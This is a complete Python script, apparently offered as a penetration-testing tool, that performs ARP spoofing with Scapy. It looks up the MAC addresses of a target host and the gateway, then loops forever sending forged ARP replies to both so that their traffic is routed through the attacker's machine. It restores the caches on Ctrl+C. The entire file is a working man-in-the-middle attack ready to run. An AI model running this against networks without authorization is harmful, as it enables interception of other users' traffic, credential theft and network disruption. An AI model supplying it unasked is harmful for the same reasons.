#!/usr/bin/env python3

import argparse
import sys
import time
from signal import SIGINT, signal

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp
from termcolor import colored


def get_arguments():
    parser = argparse.ArgumentParser(
        description="Modular ARP Spoofing tool for local network authorized penetration testing."
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="Target IP address to spoof (e.g., 192.168.1.50)",
    )
    parser.add_argument(
        "-g",
        "--gateway",
        required=True,
        help="Gateway/Router IP address (e.g., 192.168.1.1)",
    )
    return parser.parse_args()


def get_mac(ip_address):
    """
    Automating discovery: Sends an ARP request to retrieve the target's real MAC address.
    """
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    try:
        answered, _ = srp(packet, timeout=2, verbose=False)
        if answered:
            return answered[0][1].hwsrc
    except PermissionError:
        print(
            colored(
                "[-] Error: Root privileges (sudo) required to send raw network frames.",
                "red",
            )
        )
        sys.exit(1)
    return None


def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends a forged ARP response (op=2) pretending to be 'spoof_ip'.
    Omitting 'hwsrc' allows Scapy to automatically use our real local MAC address.
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, source_ip, destination_mac, source_mac):
    """
    Re-aligns the network by sending correct ARP data back to the targets.
    """
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    # Send a few times to make sure the updates stick
    send(packet, count=4, verbose=False)


def main():
    args = get_arguments()
    target_ip = args.target
    gateway_ip = args.gateway

    print(colored("[*] Resolving target and gateway MAC addresses...", "cyan"))
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(
            colored(
                f"[-] Critical: Could not find MAC address for target {target_ip}.",
                "red",
            )
        )
        sys.exit(1)
    if not gateway_mac:
        print(
            colored(
                f"[-] Critical: Could not find MAC address for gateway {gateway_ip}.",
                "red",
            )
        )
        sys.exit(1)

    print(
        colored(
            f"[+] Target MAC: {target_mac}\n[+] Gateway MAC: {gateway_mac}", "green"
        )
    )
    print(
        colored(
            "\n[*] Initializing ARP Spoofing loop. Press Ctrl+C to halt and restore network...",
            "magenta",
        )
    )

    # Dynamic signal handler to handle restoration cleanly inside the loop scope
    def signal_handler(signum, frame):
        print(
            colored(
                "\n[!] Ctrl+C caught! Restoring network caches. Please wait...",
                "yellow",
            )
        )
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print(colored("[+] Network re-aligned successfully. Exiting.", "green"))
        sys.exit(0)

    signal(SIGINT, signal_handler)

    sent_packets_count = 0
    try:
        while True:
            # Tell Target we are the Gateway
            spoof(target_ip, gateway_ip, target_mac)
            # Tell Gateway we are the Target
            spoof(gateway_ip, target_ip, gateway_mac)

            sent_packets_count += 2
            print(f"\r[+] Packets transmitted: {sent_packets_count}", end="")
            time.sleep(2)
    except Exception as e:
        print(colored(f"\n[-] Unexpected runtime error: {e}", "red"))
        # Fallback network restoration
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)


if __name__ == "__main__":
    main()
